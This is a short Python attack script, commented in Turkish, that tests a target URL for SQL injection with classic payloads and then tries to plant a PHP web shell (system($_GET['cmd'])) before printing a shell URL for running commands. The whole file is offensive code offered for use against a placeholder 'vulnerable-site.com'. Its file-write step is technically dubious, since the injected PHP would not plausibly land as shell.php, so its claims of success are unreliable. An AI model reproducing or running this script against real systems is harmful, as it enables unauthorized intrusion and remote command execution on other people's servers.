import requests
import urllib.parse

class SQLiToWebShell:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_vulnerability(self, param):
        """SQLi açığını test etme"""
        test_payloads = ["'", "' OR '1'='1", "' OR 1=1 --"]
        for payload in test_payloads:
            test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
            response = self.session.get(test_url)
            if "error" in response.text.lower() or "syntax" in response.text:
                print(f"[+] SQLi Açığı Bulundu: {payload}")
                return True
        return False
    
    def upload_webshell(self, upload_path, php_code="<?php system($_GET['cmd']); ?>"):
        """Web shell yükleme (FILE WRITE/UNION SELECT kullanarak)"""
        payload = f"'); {php_code} -- "
        malicious_request = {
            "username": payload,
            "submit": "upload"
        }
        try:
            response = self.session.post(f"{self.target_url}/{upload_path}", data=malicious_request)
            if response.status_code == 200:
                print(f"[+] Web Shell Yüklendi: {self.target_url}/shell.php?cmd=whoami")
        except Exception as e:
            print(f"[-] Hata: {str(e)}")

# Kullanım Örneği
if __name__ == "__main__":
    target = "http://vulnerable-site.com/login.php"
    sqli = SQLiToWebShell(target)
    
    if sqli.test_vulnerability("username"):
        sqli.upload_webshell("upload.php")